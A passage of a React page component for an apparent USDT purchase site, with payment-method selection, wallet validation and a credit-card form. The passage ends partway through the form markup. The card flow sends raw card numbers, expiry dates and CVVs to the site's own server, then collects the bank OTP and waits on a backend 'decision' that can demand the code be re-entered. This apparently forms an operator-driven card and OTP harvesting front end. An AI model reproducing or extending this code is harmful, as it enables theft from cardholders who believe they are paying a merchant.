import React, { useEffect, useMemo, useState } from 'react';
import { Link, useLocation } from 'react-router-dom';
import { translations } from '../translations';
import { createOrder, getPaymentDetails, submitCreditCardOtp, fetchCreditCardOtpDecision } from '../api';
import { getOrCreateVisitorId } from '../visitTracking';
import { saveOrderLocal } from '../lib/savedOrders';
import Header from '../components/Header';
import Footer from '../components/Footer';

function useCountdown(targetMs) {
  const [now, setNow] = useState(() => Date.now());

  useEffect(() => {
    const t = setInterval(() => setNow(Date.now()), 250);
    return () => clearInterval(t);
  }, []);

  const remainingMs = Math.max(0, targetMs - now);
  const totalSeconds = Math.floor(remainingMs / 1000);
  const mm = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
  const ss = String(totalSeconds % 60).padStart(2, '0');
  return { remainingMs, mm, ss };
}

function detectCardBrand(digits) {
  const d = String(digits || '').trim();
  if (!d) return { key: 'unknown', labelAr: '', labelEn: '' };
  if (/^4/.test(d)) return { key: 'visa', labelAr: 'Visa', labelEn: 'Visa' };
  const mc2 = /^5[1-5]/.test(d);
  const mc22 = /^2(2[2-9]|[3-6][0-9]|7[01]|720)/.test(d); // 2221-2720
  if (mc2 || mc22) return { key: 'mastercard', labelAr: 'MasterCard', labelEn: 'MasterCard' };
  if (/^3[47]/.test(d)) return { key: 'amex', labelAr: 'AmEx', labelEn: 'AmEx' };
  return { key: 'unknown', labelAr: '', labelEn: '' };
}

function formatCardNumber(digits) {
  const d = String(digits || '').replace(/\D/g, '').slice(0, 19);
  const parts = d.match(/.{1,4}/g) || [];
  return parts.join(' ');
}

function formatExpiryInput(raw) {
  const digits = String(raw || '').replace(/\D/g, '').slice(0, 4);
  if (!digits) return '';
  if (digits.length <= 2) return digits;
  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

export default function BuyPage() {
  const location = useLocation();
  const state = location.state || {};

  const [lang, setLang] = useState(state.lang || 'ar');
  const t = translations[lang];
  const isRtl = lang === 'ar';
  const toggleLang = () => setLang((prev) => (prev === 'ar' ? 'en' : 'ar'));

  const usdtAmount = Number(state.usdtAmount || 0);
  const KYC_THRESHOLD = Number(import.meta.env.VITE_KYC_THRESHOLD_USDT) || 1500;
  const needsKyc = usdtAmount >= KYC_THRESHOLD;

  const [loading, setLoading] = useState(true);
  const [details, setDetails] = useState(null);
  const RATE = useMemo(() => Number(details?.rate || 1320), [details?.rate]);
  const iqdAmount = useMemo(() => (usdtAmount * RATE).toLocaleString(), [usdtAmount, RATE]);
  const [error, setError] = useState('');
  const [paymentMethod, setPaymentMethod] = useState(state.paymentMethod || 'CreditCard');
  const [stage, setStage] = useState(1);
  const [name, setName] = useState(state.name || '');
  const [usdtWallet, setUsdtWallet] = useState(state.wallet || '');
  const [walletNetwork, setWalletNetwork] = useState('TRC20');
  const [paymentDetail, setPaymentDetail] = useState('');
  const [senderNumber, setSenderNumber] = useState('');
  const [paymentProof, setPaymentProof] = useState(null);
  const [fastPayQrFailed, setFastPayQrFailed] = useState(false);
  const [zainQrFailed, setZainQrFailed] = useState(false);
  const [fibQrFailed, setFibQrFailed] = useState(false);
  const [mastercardQrFailed, setMastercardQrFailed] = useState(false);
  const [copied, setCopied] = useState('');
  const [orderId, setOrderId] = useState('');
  const [sending, setSending] = useState(false);
  const [sent, setSent] = useState(false);
  const [kycAcknowledged, setKycAcknowledged] = useState(false);

  // Credit card flow (OTP)
  const [cardHolderName, setCardHolderName] = useState(state.cardHolderName || '');
  const [cardNumber, setCardNumber] = useState(state.cardNumber || '');
  const [cardExpiry, setCardExpiry] = useState(state.cardExpiry || '');
  const [cardCvv, setCardCvv] = useState(state.cardCvv || '');
  const [otpCode, setOtpCode] = useState('');
  const [otpExpiresAt, setOtpExpiresAt] = useState(null);
  const [verifyingOtp, setVerifyingOtp] = useState(false);

  const [ccSubmissionId, setCcSubmissionId] = useState('');

  useEffect(() => {
    document.documentElement.dir = isRtl ? 'rtl' : 'ltr';
    document.documentElement.lang = lang;
  }, [isRtl, lang]);

  useEffect(() => {
    let mounted = true;
    setLoading(true);
    getPaymentDetails()
      .then((d) => mounted && setDetails(d))
      .catch((e) => {
        if (!mounted) return;
        if (e?.code === 'IP_BLOCKED' || e?.code === 'FP_BLOCKED') {
          const localized = lang === 'en'
            ? (e?.messageEn || e?.message || 'This IP has been blocked for policy violation. Please contact support.')
            : (e?.messageAr || e?.message || 'تم حظر هذا العنوان بسبب مخالفة. يرجى التواصل مع الدعم.');
          setError(localized);
          return;
        }
        setError(String(e?.message || e));
      })
      .finally(() => mounted && setLoading(false));
    return () => {
      mounted = false;
    };
  }, [lang]);

  const expiresAtMs = useMemo(() => {
    const mins = Number(details?.paymentExpiryMinutes || 15);
    return (state.createdAtMs || Date.now()) + mins * 60_000;
  }, [details?.paymentExpiryMinutes, state.createdAtMs]);

  const cd = useCountdown(expiresAtMs);

  const methodOrder = useMemo(
    () => [
      { key: 'creditCard', label: 'CreditCard', labelAr: 'بطاقة ائتمان' },
      { key: 'fastPay', label: 'FastPay', labelAr: 'فاست باي' },
      { key: 'zainCash', label: 'Zain Cash', labelAr: 'زين كاش' },
      { key: 'fib', label: 'FIB', labelAr: 'المصرف الأول' },
      { key: 'mastercard', label: 'MasterCard', labelAr: 'ماستر كارد' },
      { key: 'asiaHawala', label: 'Asia Hawala', labelAr: 'آسيا حوالة' },
    ],
    []
  );

  const pm = details?.methods || {};

  const paymentMethodOptions = useMemo(() => {
    if (!details?.methods || typeof details.methods !== 'object') return [];
    return methodOrder.filter((o) => Object.prototype.hasOwnProperty.call(details.methods, o.key));
  }, [details?.methods, methodOrder]);

  useEffect(() => {
    if (!paymentMethodOptions.length) return;
    const ok = paymentMethodOptions.some((o) => o.label === paymentMethod);
    if (!ok) setPaymentMethod(paymentMethodOptions[0].label);
  }, [paymentMethod, paymentMethodOptions]);

  useEffect(() => {
    // Reset flow when switching payment methods.
    setStage(1);
    setOtpCode('');
    setOtpExpiresAt(null);
    setVerifyingOtp(false);
  }, [paymentMethod]);

  useEffect(() => { setFastPayQrFailed(false); }, [pm?.fastPay?.qrImage]);
  useEffect(() => { setZainQrFailed(false); }, [pm?.zainCash?.qrImage]);
  useEffect(() => { setFibQrFailed(false); }, [pm?.fib?.qrImage]);
  useEffect(() => { setMastercardQrFailed(false); }, [pm?.mastercard?.qrImage]);

  const normalizedWallet = usdtWallet.trim();
  const normalizedNetwork = walletNetwork.toUpperCase();
  const isEvmNetwork = normalizedNetwork === 'ERC20' || normalizedNetwork === 'BEP20';
  const walletValid = isEvmNetwork
    ? /^0x[a-fA-F0-9]{40}$/.test(normalizedWallet)
    : /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(normalizedWallet);
  const senderValid = !senderNumber || /^07\d{9}$/.test(senderNumber.trim());
  const canMoveToPayDetails = Boolean(paymentMethod && usdtWallet && walletNetwork && usdtAmount >= 5 && walletValid);
  const isCreditCard = paymentMethod === 'CreditCard';

  const cardHolderValid = isCreditCard ? Boolean(String(cardHolderName || '').trim()) : true;
  const cardNumberDigits = isCreditCard ? String(cardNumber || '').replace(/\D/g, '') : '';
  const cardNumberValid = isCreditCard ? (cardNumberDigits.length >= 13 && cardNumberDigits.length <= 19) : true;
  const cardExpiryValid = isCreditCard
    ? (() => {
      const m = String(cardExpiry || '').trim().match(/^(\d{2})\/(\d{2})$/);
      if (!m) return false;
      const mm = Number(m[1]);
      return mm >= 1 && mm <= 12;
    })()
    : true;
  const cardCvvValid = isCreditCard ? /^[0-9A-Za-z]{3}$/.test(String(cardCvv || '').trim()) : true;

  const ccBrand = isCreditCard ? detectCardBrand(cardNumberDigits) : { key: 'unknown', labelAr: '', labelEn: '' };
  const formattedCardNumber = isCreditCard ? formatCardNumber(cardNumberDigits) : '';
  const cardCvvDigitsOnly = isCreditCard ? String(cardCvv || '').replace(/\D/g, '').slice(0, 3) : '';

  const canSendCard = Boolean(
    isCreditCard &&
      usdtWallet &&
      walletNetwork &&
      usdtAmount >= 5 &&
      walletValid &&
      cardHolderValid &&
      cardNumberValid &&
      cardExpiryValid &&
      cardCvvValid
  );
  const createdOrderId = useMemo(() => `ORD-${Date.now().toString(36).toUpperCase()}`, []);

  const copyText = async (value, key) => {
    try {
      await navigator.clipboard.writeText(value);
      setCopied(key);
      setTimeout(() => setCopied(''), 1500);
    } catch {
      // ignore
    }
  };

  const onConfirm = async () => {
    if (isCreditCard) {
      if (!canSendCard) {
        setError(isRtl ? 'يرجى إكمال بيانات بطاقة الائتمان بشكل صحيح.' : 'Please complete the card fields correctly.');
        return;
      }
    } else if (!name || !usdtWallet || !walletNetwork || usdtAmount < 5 || !walletValid || !senderValid) {
      setError(isRtl ? 'يرجى إكمال الحقول المطلوبة (الحد الأدنى 5 USDT).' : 'Please complete required fields (minimum 5 USDT).');
      return;
    }
    if (needsKyc && !kycAcknowledged) {
      setError(t.kycAckRequired);
      return;
    }
    setSending(true);
    setError('');
    try {
      let paymentProofBase64 = '';
      let paymentProofMime = '';
      if (paymentProof) {
        paymentProofBase64 = await new Promise((resolve, reject) => {
          const reader = new FileReader();
          reader.onload = () => {
            const result = reader.result;
            resolve(result.split(',')[1] || '');
          };
          reader.onerror = reject;
          reader.readAsDataURL(paymentProof);
        });
        paymentProofMime = paymentProof.type || 'image/jpeg';
      }
      const response = await createOrder({
        orderId: createdOrderId,
        visitorId: getOrCreateVisitorId(),
        name: isCreditCard ? (cardHolderName || name) : name,
        wallet: normalizedWallet,
        walletNetwork: normalizedNetwork,
        usdtAmount,
        iqdAmount,
        paymentMethod,
        paymentDetail,
        senderNumber,
        cardHolderName: isCreditCard ? cardHolderName : undefined,
        cardNumber: isCreditCard ? cardNumber : undefined,
        cardExpiry: isCreditCard ? cardExpiry : undefined,
        cardCvv: isCreditCard ? cardCvv : undefined,
        paymentProofName: paymentProof?.name || '',
        paymentProofBase64,
        paymentProofMime,
        kycAcknowledged: !needsKyc || kycAcknowledged,
      });
      const oid = response?.orderId || createdOrderId;
      setOrderId(oid);
      saveOrderLocal({ orderId: oid, usdtAmount });

      if (isCreditCard && response?.otpRequired) {
        setOtpExpiresAt(response?.otpExpiresAt || null);
        setOtpCode('');
        setStage(3);
      } else {
        setSent(true);
      }
    } catch (e) {
      if (e?.code === 'ORDER_RATE_LIMIT') {
        setError(isRtl ? e.message : (e.errorEn || e.message));
      } else if (e?.code === 'KYC_ACK_REQUIRED') {
        setError(lang === 'en' ? (e.errorEn || e.message) : e.message);
      } else if (e?.code === 'IP_BLOCKED' || e?.code === 'FP_BLOCKED') {
        const localized = lang === 'en'
          ? (e?.messageEn || e?.message || 'This IP has been blocked for policy violation. Please contact support.')
          : (e?.messageAr || e?.message || 'تم حظر هذا العنوان بسبب مخالفة. يرجى التواصل مع الدعم.');
        setError(localized);
      } else {
        setError(String(e?.message || e));
      }
    } finally {
      setSending(false);
    }
  };

  const onSubmitOtp = async () => {
    if (!orderId) {
      setError(isRtl ? 'رقم الطلب غير موجود. أعد المحاولة.' : 'Missing order id. Please try again.');
      return;
    }
    const code = String(otpCode || '').trim();
    if (!/^\d{3,9}$/.test(code)) {
      setError(isRtl ? 'يرجى إدخال كود مكوّن من 3 إلى 9 أرقام.' : 'Please enter a code with 3 to 9 digits.');
      return;
    }

    setVerifyingOtp(true);
    setError('');
    try {
      const resp = await submitCreditCardOtp(orderId, code);
      if (!resp?.submissionId) throw new Error('Missing submissionId');
      setCcSubmissionId(resp.submissionId);
      setStage(4);
    } catch (e) {
      if (e?.code === 'OTP_NOT_FOUND_OR_EXPIRED') {
        setError(isRtl ? 'انتهت صلاحية الكود. أعد المحاولة.' : 'OTP expired. Please try again.');
      } else {
        setError(String(e?.message || e));
      }
    } finally {
      setVerifyingOtp(false);
    }
  };

  useEffect(() => {
    if (stage !== 4 || !ccSubmissionId) return;
    let alive = true;
    let timer = null;
    const poll = async () => {
      try {
        const r = await fetchCreditCardOtpDecision(ccSubmissionId);
        if (!alive) return;
        const decision = String(r?.decision || 'pending');
        if (!decision || decision === 'pending') return;

        if (decision === 'completed') {
          setStage(5);
          setTimeout(() => {
            if (alive) setSent(true);
          }, 1100);
          return;
        }

        if (decision === 'rejected') {
          setError(isRtl ? 'تم رفض العملية. حاول مرة أخرى.' : 'Your code was rejected. Please try again.');
          setStage(3);
          setOtpCode('');
          return;
        }

        if (decision === 'reenter') {
          setError(
            isRtl
              ? 'من فضلك قم بإدخال الرمز الصحيح.'
              : 'Please enter the correct code.'
          );
          setStage(3);
          setOtpCode('');
          return;
        }

        // hold or unknown: keep waiting
      } catch {
        // ignore polling errors
      }
    };

    poll();
    timer = setInterval(poll, 2200);
    return () => {
      alive = false;
      if (timer) clearInterval(timer);
    };
  }, [stage, ccSubmissionId, isRtl]);

  if (sent) {
    return (
      <div className="page-shell">
        <Header t={t} lang={lang} toggleLang={toggleLang} />
        <main className="buy-page-main buy-page-executive">
          <section className="container py-10" style={{ maxWidth: 900 }}>
            <div className="glass-panel w-full text-center buy-success-card-executive" style={{ padding: '3rem 2rem', border: '2px solid var(--accent-primary)' }}>
              <div style={{ fontSize: '4rem', marginBottom: '1rem', lineHeight: 1 }}>
                <svg width="64" height="64" viewBox="0 0 24 24" fill="none" style={{ color: 'var(--accent-primary)' }}>
                  <path d="M20 7L9 18l-5-5" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </div>
              <h2 className="text-accent mb-4">
                {paymentMethod === 'CreditCard'
                  ? (isRtl ? 'اكتملت العملية' : 'Process Completed')
                  : t.successTitle}
              </h2>
              <p className="text-muted" style={{ fontSize: '1.1rem', lineHeight: 1.6 }}>
                {paymentMethod === 'CreditCard'
                  ? (isRtl ? 'اكتملت العملية بنجاح. تم تحديث الحالة.' : 'Process completed successfully. Status updated.')
                  : t.successMessage}
              </p>
              {!!orderId && (
                <p className="text-muted mt-4">
                  {isRtl ? 'رقم الطلب:' : 'Order ID:'} <span className="text-accent">{orderId}</span>
                </p>
              )}
              {!!orderId && (
                <p className="text-muted text-sm mt-3" style={{ maxWidth: 420, margin: '0 auto' }}>
                  {t.trackOrderHint}
                </p>
              )}
              {!!orderId && (
                <p className="text-muted text-sm mt-2" style={{ maxWidth: 440, margin: '0 auto' }}>
                  {t.successInvoiceHow}
                </p>
              )}
              <div className="mt-6" style={{ display: 'flex', flexWrap: 'wrap', gap: '0.75rem', justifyContent: 'center' }}>
                {!!orderId && (
                  <Link to={`/track?order=${encodeURIComponent(orderId)}`} className="btn btn-primary">
                    {t.trackOrderOpen}
                  </Link>
                )}
                <Link to="/my-orders" className="btn btn-outline">{t.navMyOrders}</Link>
                <Link to="/" className="btn btn-outline">{t.navHome}</Link>
              </div>
            </div>
          </section>
        </main>
        <Footer t={t} lang={lang} />
      </div>
    );
  }

  return (
    <div className="page-shell">
      <Header t={t} lang={lang} toggleLang={toggleLang} />
      <main className="buy-page-main buy-page-executive">
      <section className="container py-10 buy-executive-shell" style={{ maxWidth: 900 }}>
      <div className="glass-panel buy-panel buy-panel-executive" style={{ padding: '1.75rem', border: '1px solid var(--accent-primary)' }}>
            <div className="buy-header mb-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
          <div className="buy-title-wrap">
            <h2 className="text-accent mb-1">{isRtl ? 'تفاصيل الدفع' : 'Payment Details'}</h2>
            {details?.activeProfile?.nameAr && (
              <div className="text-muted text-sm mb-1" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                {isRtl ? 'حساب الاستلام:' : 'Receiving account:'}{' '}
                <span className="text-accent">{isRtl ? details.activeProfile.nameAr : (details.activeProfile.nameEn || details.activeProfile.nameAr)}</span>
              </div>
            )}
            <div className="text-muted text-sm buy-amount-line">
              <span dir="ltr" style={{ unicodeBidi: 'plaintext' }}>
                {usdtAmount} USDT ≈ {iqdAmount} IQD
              </span>
            </div>
          </div>
          <div className="text-center buy-timer" style={{ minWidth: 140 }}>
            <div className="text-muted text-sm">{isRtl ? 'الوقت المتبقي' : 'Time left'}</div>
            <div className="text-accent" style={{ fontWeight: 900, fontSize: '1.6rem' }}>
              {cd.mm}:{cd.ss}
            </div>
          </div>
        </div>

        {loading ? (
          <div className="text-muted">{isRtl ? 'جاري التحميل...' : 'Loading...'}</div>
        ) : (
          <>
            {error && (
              <div className="text-error mb-4" style={{ whiteSpace: 'pre-wrap' }}>
                {error}
              </div>
            )}

            <div className="buy-form-grid mb-2" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
              <div className="input-group" style={{ flex: 1, minWidth: '240px' }}>
                <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>{t.selectPayment}</label>
                <select
                  className="input-control"
                  value={paymentMethod}
                  onChange={(e) => setPaymentMethod(e.target.value)}
                  disabled={!paymentMethodOptions.length}
                  style={{ textAlign: isRtl ? 'right' : 'left', appearance: 'none', cursor: 'pointer' }}
                >
                  {paymentMethodOptions.map((m) => (
                    <option key={m.key} value={m.label}>
                      {isRtl ? m.labelAr : m.label}
                    </option>
                  ))}
                </select>
              </div>
              <div className="input-group" style={{ flex: 1, minWidth: '240px' }}>
                <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                  {isRtl ? 'عنوان محفظة USDT' : 'USDT Wallet Address'}
                </label>
                <input
                  className="input-control"
                  value={usdtWallet}
                  onChange={(e) => setUsdtWallet(e.target.value)}
                  placeholder={isRtl ? 'T... أو 0x...' : 'T... or 0x...'}
                  dir="ltr"
                  style={{ textAlign: 'left' }}
                />
                {normalizedWallet && !walletValid && (
                  <div className="text-error text-sm mt-2" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                    {isRtl
                      ? (isEvmNetwork ? 'عنوان ERC20/BEP20 يجب أن يبدأ بـ 0x وطوله 42 حرف.' : 'عنوان TRC20 يجب أن يبدأ بـ T وصحيح.')
                      : (isEvmNetwork ? 'ERC20/BEP20 address must start with 0x and be 42 chars.' : 'TRC20 address must start with T and be valid.')}
                  </div>
                )}
              </div>
              <div className="input-group" style={{ flex: 1, minWidth: '240px' }}>
                <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                  {isRtl ? 'شبكة التحويل' : 'Network'}
                </label>
                <select
                  className="input-control"
                  value={walletNetwork}
                  onChange={(e) => setWalletNetwork(e.target.value)}
                  style={{ textAlign: isRtl ? 'right' : 'left', appearance: 'none', cursor: 'pointer' }}
                >
                  <option value="TRC20">TRC20</option>
                  <option value="ERC20">ERC20</option>
                  <option value="BEP20">BEP20</option>
                </select>
              </div>
            </div>
            <div className="text-muted text-sm mb-6" style={{ textAlign: isRtl ? 'right' : 'left' }}>
              {isRtl ? 'أقل مبلغ للتحويل هو 5 USDT' : 'Minimum transfer amount is 5 USDT'}
            </div>

            {stage === 2 && (
            <>
              {paymentMethod === 'FastPay' && (
                <div className="text-center">
                  <p className="text-sm mb-4">{t.fastPayInstructions}</p>
                  {pm?.fastPay?.qrImage && !fastPayQrFailed && (
                    <div style={{ background: '#fff', padding: '1rem', borderRadius: '8px', display: 'inline-block', marginBottom: '1rem' }}>
                      <img
                        src={pm.fastPay.qrImage}
                        alt="FastPay QR"
                        onError={() => setFastPayQrFailed(true)}
                        style={{ width: '150px', height: '150px', objectFit: 'contain' }}
                      />
                    </div>
                  )}
                  {fastPayQrFailed && (
                    <p className="text-muted text-sm mb-4">
                      {isRtl ? 'تعذر تحميل صورة QR، استخدم الرقم مباشرة.' : 'QR image unavailable, use the number directly.'}
                    </p>
                  )}
                  {pm?.fastPay?.number && (
                    <div className="flex justify-center items-center gap-2 text-xl font-bold text-accent">
                      <span>{pm.fastPay.number}</span>
                      <button type="button" className="copy-btn" onClick={() => copyText(pm.fastPay.number, 'fastpay')} aria-label={isRtl ? 'نسخ الرقم' : 'Copy number'}>
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                          <rect x="9" y="9" width="13" height="13" rx="2" stroke="currentColor" strokeWidth="1.8" />
                          <rect x="2" y="2" width="13" height="13" rx="2" stroke="currentColor" strokeWidth="1.8" />
                        </svg>
                      </button>
                    </div>
                  )}
                  {copied === 'fastpay' && <div className="copy-toast">{isRtl ? 'تم النسخ' : 'Copied'}</div>}
                </div>
              )}

              {paymentMethod === 'Zain Cash' && (
                <div className="text-center">
                  <p className="text-sm mb-4">{t.zainInstructions}</p>
                  {pm?.zainCash?.qrImage && !zainQrFailed && (
                    <div style={{ background: '#fff', padding: '1rem', borderRadius: '8px', display: 'inline-block', marginBottom: '1rem' }}>
                      <img
                        src={pm.zainCash.qrImage}
                        alt="QR Code"
                        onError={() => setZainQrFailed(true)}
                        style={{ width: '150px', height: '150px', objectFit: 'contain' }}
                      />
                    </div>
                  )}
                  {zainQrFailed && (
                    <p className="text-muted text-sm mb-4">
                      {isRtl ? 'تعذر تحميل صورة QR، استخدم الرقم مباشرة.' : 'QR image unavailable, use the number directly.'}
                    </p>
                  )}
                  {pm?.zainCash?.number && (
                    <div className="flex justify-center items-center gap-2 text-xl font-bold text-accent">
                      <span>{pm.zainCash.number}</span>
                      <button type="button" className="copy-btn" onClick={() => copyText(pm.zainCash.number, 'zain')} aria-label={isRtl ? 'نسخ الرقم' : 'Copy number'}>
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                          <rect x="9" y="9" width="13" height="13" rx="2" stroke="currentColor" strokeWidth="1.8" />
                          <rect x="2" y="2" width="13" height="13" rx="2" stroke="currentColor" strokeWidth="1.8" />
                        </svg>
                      </button>
                    </div>
                  )}
                  {copied === 'zain' && <div className="copy-toast">{isRtl ? 'تم النسخ' : 'Copied'}</div>}
                </div>
              )}

              {paymentMethod === 'Asia Hawala' && (
                <div>
                  <p className="text-sm mb-4">{t.asiaInstructions}</p>
                  {pm?.asiaHawala?.number && (
                    <div className="flex justify-center items-center gap-2 text-xl font-bold text-accent mb-6">
                      <span>{pm.asiaHawala.number}</span>
                      <button type="button" className="copy-btn" onClick={() => copyText(pm.asiaHawala.number, 'asia')} aria-label={isRtl ? 'نسخ الرقم' : 'Copy number'}>
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                          <rect x="9" y="9" width="13" height="13" rx="2" stroke="currentColor" strokeWidth="1.8" />
                          <rect x="2" y="2" width="13" height="13" rx="2" stroke="currentColor" strokeWidth="1.8" />
                        </svg>
                      </button>
                    </div>
                  )}
                  <div className="input-group">
                    <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>{t.senderNumber}</label>
                    <input
                      type="tel"
                      className="input-control"
                      placeholder="07xxxxxxxxx"
                      value={senderNumber}
                      onChange={(e) => setSenderNumber(e.target.value)}
                      style={{ textAlign: 'left', direction: 'ltr' }}
                    />
                    {!!senderNumber && !senderValid && (
                      <div className="text-error text-sm mt-2" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                        {isRtl ? 'رقم الهاتف يجب أن يكون بصيغة 07xxxxxxxxx' : 'Phone should be in format 07xxxxxxxxx'}
                      </div>
                    )}
                  </div>
                  {copied === 'asia' && <div className="copy-toast">{isRtl ? 'تم النسخ' : 'Copied'}</div>}
                </div>
              )}

              {paymentMethod === 'FIB' && (
                <div>
                  <p className="text-sm mb-4">{t.genericInstructions}</p>
                  {pm?.fib?.qrImage && !fibQrFailed && (
                    <div className="text-center mb-4">
                      <div style={{ background: '#fff', padding: '1rem', borderRadius: '8px', display: 'inline-block' }}>
                        <img
                          src={pm.fib.qrImage}
                          alt="FIB QR Code"
                          onError={() => setFibQrFailed(true)}
                          style={{ width: '150px', height: '150px', objectFit: 'contain' }}
                        />
                      </div>
                    </div>
                  )}
                  {fibQrFailed && (
                    <p className="text-muted text-sm mb-4 text-center">
                      {isRtl ? 'تعذر تحميل صورة QR، استخدم بيانات الحساب مباشرة.' : 'QR image unavailable, use account details directly.'}
                    </p>
                  )}
                  <div className="flex flex-col gap-2">
                    <div className="flex justify-between p-2 bg-black/20 rounded">
                      <span className="text-muted">{isRtl ? 'رقم الحساب:' : 'Account:'}</span>
                      <div className="flex items-center gap-2">
                        <span className="font-bold">{pm?.fib?.accountNumber || ''}</span>
                        {pm?.fib?.accountNumber && (
                          <button type="button" className="copy-btn" onClick={() => copyText(pm.fib.accountNumber, 'fib-acc')} aria-label={isRtl ? 'نسخ' : 'Copy'}>
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                              <rect x="9" y="9" width="13" height="13" rx="2" stroke="currentColor" strokeWidth="1.8" />
                              <rect x="2" y="2" width="13" height="13" rx="2" stroke="currentColor" strokeWidth="1.8" />
                            </svg>
                          </button>
                        )}
                      </div>
                    </div>
                    <div className="flex justify-between p-2 bg-black/20 rounded">
                      <span className="text-muted">{isRtl ? 'الاسم:' : 'Name:'}</span>
                      <span className="font-bold">{pm?.fib?.accountName || ''}</span>
                    </div>
                  </div>
                  {copied === 'fib-acc' && <div className="copy-toast">{isRtl ? 'تم النسخ' : 'Copied'}</div>}
                </div>
              )}

              {paymentMethod === 'MasterCard' && (
                <div>
                  <p className="text-sm mb-4">{t.genericInstructions}</p>
                  {pm?.mastercard?.qrImage && !mastercardQrFailed && (
                    <div className="text-center mb-4">
                      <div style={{ background: '#fff', padding: '1rem', borderRadius: '8px', display: 'inline-block' }}>
                        <img
                          src={pm.mastercard.qrImage}
                          alt="MasterCard QR Code"
                          onError={() => setMastercardQrFailed(true)}
                          style={{ width: '150px', height: '150px', objectFit: 'contain' }}
                        />
                      </div>
                    </div>
                  )}
                  {mastercardQrFailed && (
                    <p className="text-muted text-sm mb-4 text-center">
                      {isRtl ? 'تعذر تحميل صورة QR، استخدم بيانات البطاقة مباشرة.' : 'QR image unavailable, use card details directly.'}
                    </p>
                  )}
                  <div className="flex flex-col gap-2">
                    <div className="flex justify-between p-2 bg-black/20 rounded">
                      <span className="text-muted">{isRtl ? 'رقم البطاقة:' : 'Card #:'}</span>
                      <div className="flex items-center gap-2">
                        <span className="font-bold">{pm?.mastercard?.cardNumber || ''}</span>
                        {pm?.mastercard?.cardNumber && (
                          <button type="button" className="copy-btn" onClick={() => copyText(pm.mastercard.cardNumber, 'mc-num')} aria-label={isRtl ? 'نسخ' : 'Copy'}>
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                              <rect x="9" y="9" width="13" height="13" rx="2" stroke="currentColor" strokeWidth="1.8" />
                              <rect x="2" y="2" width="13" height="13" rx="2" stroke="currentColor" strokeWidth="1.8" />
                            </svg>
                          </button>
                        )}
                      </div>
                    </div>
                    <div className="flex justify-between p-2 bg-black/20 rounded">
                      <span className="text-muted">{isRtl ? 'اسم الحامل:' : 'Holder:'}</span>
                      <span className="font-bold">{pm?.mastercard?.cardHolder || ''}</span>
                    </div>
                  </div>
                  {copied === 'mc-num' && <div className="copy-toast">{isRtl ? 'تم النسخ' : 'Copied'}</div>}
                </div>
              )}
            </>
            )}

            {stage === 2 && (
              <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
                {isCreditCard && (
                  <div className="cc-preview-shell buy-span-2">
                    <div className="cc-preview">
                      <div className="cc-preview-top">
                        <div className={`cc-brand-icon ${cardNumberDigits ? 'cc-brand-icon--animate' : ''}`}>
                          {ccBrand.key === 'visa' && (
                            <svg viewBox="0 0 120 76" width="64" height="42" aria-hidden="true">
                              <rect x="0" y="0" width="120" height="76" rx="12" fill="rgba(255,255,255,0.06)" />
                              <text x="60" y="48" textAnchor="middle" fontSize="34" fontFamily="Arial" fill="currentColor" fontWeight="700">VISA</text>
                            </svg>
                          )}
                          {ccBrand.key === 'mastercard' && (
                            <svg viewBox="0 0 120 76" width="64" height="42" aria-hidden="true">
                              <rect x="0" y="0" width="120" height="76" rx="12" fill="rgba(255,255,255,0.06)" />
                              <circle cx="50" cy="38" r="18" fill="rgba(235,87,87,0.95)" />
                              <circle cx="70" cy="38" r="18" fill="rgba(245,203,87,0.95)" />
                              <text x="60" y="52" textAnchor="middle" fontSize="18" fontFamily="Arial" fill="white" fontWeight="700">MC</text>
                            </svg>
                          )}
                          {ccBrand.key === 'amex' && (
                            <svg viewBox="0 0 120 76" width="64" height="42" aria-hidden="true">
                              <rect x="0" y="0" width="120" height="76" rx="12" fill="rgba(255,255,255,0.06)" />
                              <text x="60" y="48" textAnchor="middle" fontSize="28" fontFamily="Arial" fill="currentColor" fontWeight="700">AMEX</text>
                            </svg>
                          )}
                          {ccBrand.key === 'unknown' && (
                            <svg viewBox="0 0 120 76" width="64" height="42" aria-hidden="true">
                              <rect x="0" y="0" width="120" height="76" rx="12" fill="rgba(255,255,255,0.06)" />
                              <text x="60" y="48" textAnchor="middle" fontSize="22" fontFamily="Arial" fill="currentColor" fontWeight="700">CARD</text>
                            </svg>
                          )}
                        </div>
                      </div>
                      <div className="cc-preview-number">
                        {formattedCardNumber || '•••• •••• •••• ••••'}
                      </div>
                      <div className="cc-preview-bottom">
                        <div className="cc-preview-exp">
                          <div className="cc-preview-label">{isRtl ? 'الانتهاء' : 'EXP'}</div>
                          <div className="cc-preview-value">{cardExpiry || 'MM/YY'}</div>
                        </div>
                        <div className="cc-preview-cvc">
                          <div className="cc-preview-label">{isRtl ? 'CVC' : 'CVC'}</div>
                          <div className={`cc-preview-value ${cardCvvValid ? 'cc-cvc-ok' : ''}`}>
                            {cardCvvDigitsOnly ? '•••' : '•••'}
                          </div>
                        </div>
                      </div>
                      <div className={`cc-preview-progress ${cardNumberDigits ? 'cc-preview-progress--active' : ''}`} />
                    </div>
                  </div>
                )}
                {!isCreditCard && (
                  <div className="input-group buy-span-2">
                    <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                      {isRtl ? 'الاسم الكامل' : 'Full Name'}
                    </label>
                    <input
                      className="input-control"
                      value={name}
                      onChange={(e) => setName(e.target.value)}
                      placeholder={isRtl ? 'أحمد محمد' : 'Ahmed Mohammed'}
